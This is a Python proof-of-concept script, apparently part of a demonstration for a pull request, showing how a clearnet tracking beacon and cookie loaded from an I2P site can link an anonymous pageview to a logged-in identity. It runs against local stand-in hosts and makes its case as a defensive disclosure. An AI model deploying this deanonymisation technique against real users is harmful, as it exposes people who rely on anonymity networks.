#!/usr/bin/env python3
"""Step 3 of the PR #314 linkability PoC: from a label to a real identity.

Steps 1-2 (visit.py + correlate.py) show that an anonymous I2P pageview can be
joined to a clearnet-observable event by a shared per-visit label. This script
stages the escalation the author described but did NOT claim steps 1-2 prove:
if the SAME browser later makes an authenticated clearnet request, the beacon's
tracking cookie bridges the anonymous label to the real identity.

It uses one cookie jar for both phases, modelling a single browser profile that
is used for both I2P (via the HTTP proxy) and ordinary clearnet browsing -- the
exact configuration a correct anonymity setup avoids, and the one PR #314
protects clients who have not isolated the two.

  Phase 1  browser on http://linkability-demo.i2p/ auto-loads the beacon
           GET <collector>/px.gif?sid=LABEL   (cross-site, no-cors)
           -> collector mints Set-Cookie: track=COOKIE  and logs (LABEL, COOKIE)

  Phase 2  later, same browser, ordinary clearnet, logged in to some site
           GET <collector>/whoami?user=alice@example.com
           -> browser re-sends Cookie: track=COOKIE
           -> collector logs (COOKIE, alice@example.com)

  Join     LABEL  ->  COOKIE  ->  alice@example.com  ->  exact I2P pageview

Run:  python3 step3_identity.py --eepsite http://127.0.0.1:8631 \
            --collector http://127.0.0.1:8632 --path /account/settings \
            --user alice@example.com
"""
import argparse
import http.cookiejar
import re
import sys
import urllib.parse
import urllib.request

UA = ("Mozilla/5.0 (X11; Linux x86_64; rv:128.0) "
      "Gecko/20100101 Firefox/128.0")


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--eepsite", required=True)
    ap.add_argument("--collector", required=True)
    ap.add_argument("--path", default="/account/settings")
    ap.add_argument("--eepsite-host", default="linkability-demo.i2p")
    ap.add_argument("--user", default="alice@example.com")
    args = ap.parse_args()

    # One cookie jar == one browser profile, shared across both networks.
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    eepsite = args.eepsite.rstrip("/")
    collector = args.collector.rstrip("/")
    origin_referer = "http://%s/" % args.eepsite_host

    # --- Phase 1: anonymous I2P pageview that auto-loads the clearnet beacon.
    nav_headers = {
        "User-Agent": UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document",
    }
    req = urllib.request.Request(eepsite + args.path, headers=nav_headers)
    body = opener.open(req, timeout=10).read().decode("utf-8", "replace")
    sys.stderr.write("[step3] phase 1: navigated I2P %s%s\n"
                     % (origin_referer.rstrip("/"), args.path))

    beacons = [u for u in sorted(set(re.findall(r'(?:src|href)="([^"]+)"', body)))
               if u.startswith(("http://", "https://"))]
    for u in beacons:
        low = u.lower()
        dest = "image" if any(x in low for x in
                              (".gif", ".png", ".jpg", ".ico", "favicon")) else "empty"
        sub = {
            "User-Agent": UA,
            "Accept": "image/avif,image/webp,*/*;q=0.8",
            "Referer": origin_referer,
            "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "no-cors",
            "Sec-Fetch-Dest": dest,
        }
        opener.open(urllib.request.Request(u, headers=sub), timeout=10).read()
        sys.stderr.write("[step3]   auto-loaded beacon %s\n" % u)

    got = [c.name for c in jar]
    sys.stderr.write("[step3] beacon set cookies: %s\n" % (got or "none"))

    # --- Phase 2: later, ordinary clearnet, authenticated. Same cookie jar.
    whoami = "%s/whoami?user=%s" % (collector, urllib.parse.quote(args.user))
    login_headers = {
        "User-Agent": UA,
        "Accept": "text/html,*/*;q=0.8",
        # A first-party clearnet visit the user made themselves, while logged
        # in. No I2P referer; the only thing tying it to I2P is the cookie.
        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Dest": "document",
    }
    resp = opener.open(urllib.request.Request(whoami, headers=login_headers),
                       timeout=10).read().decode("utf-8", "replace").strip()
    sys.stderr.write("[step3] phase 2: clearnet /whoami as %s -> %r\n"
                     % (args.user, resp))


if __name__ == "__main__":
    main()
